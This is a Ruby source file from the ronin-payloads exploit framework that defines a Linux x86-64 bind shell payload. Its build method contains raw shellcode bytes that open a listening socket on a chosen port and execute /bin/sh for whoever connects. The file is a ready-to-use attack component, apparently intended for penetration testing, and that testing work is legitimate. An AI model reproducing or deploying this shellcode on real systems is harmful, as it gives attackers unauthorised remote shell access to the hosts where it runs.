# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2026 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/bind_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module X86_64
          #
          # Linux x86-64 shellcode that binds a shell to a port.
          #
          class BindShell < BindShellPayload

            register 'shellcode/linux/x86_64/bind_shell'

            arch :x86_64
            os :linux

            author 'xi4oyu', email: 'xi4oyu@80sec.com'

            summary 'Linux x86-64 bind shell shellcode'
            description <<~DESC
              Linux x86-64 shellcode that binds a shell to a port.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-78.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2" \
                         "\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01#{packed_port}" \
                         "\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05" \
                         "\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89" \
                         "\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f" \
                         "\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21" \
                         "\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68" \
                         "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89" \
                         "\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
            end

          end
        end
      end
    end
  end
end
